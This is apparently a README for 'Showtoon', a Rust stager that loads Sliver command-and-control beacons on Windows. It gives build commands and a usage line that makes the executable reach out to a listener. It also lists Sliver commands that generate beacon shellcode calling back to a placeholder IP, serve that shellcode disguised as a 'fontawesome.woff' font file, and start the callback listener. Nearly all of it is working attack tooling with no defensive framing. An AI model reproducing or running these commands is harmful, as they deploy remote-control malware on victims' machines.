# Showtoon Sliver Stager


### Build

With just

```
just build
```

or

```
cargo build --release --target x86_64-pc-windows-gnu
```

### Usage

Use showtoon to reach out to the stager
```
.\showtoon.exe IP:8787
```



### Sliver

Create a test profile for the stager
```
profiles new -b http://IP:8686 beacon --skip-symbols --format shellcode windows-test
```

Start the stager
```
stage-listener --url "http://IP:8787/fontawesome.woff"  --profile windows-test
```

Start the http listener
```
http -l 8686
```
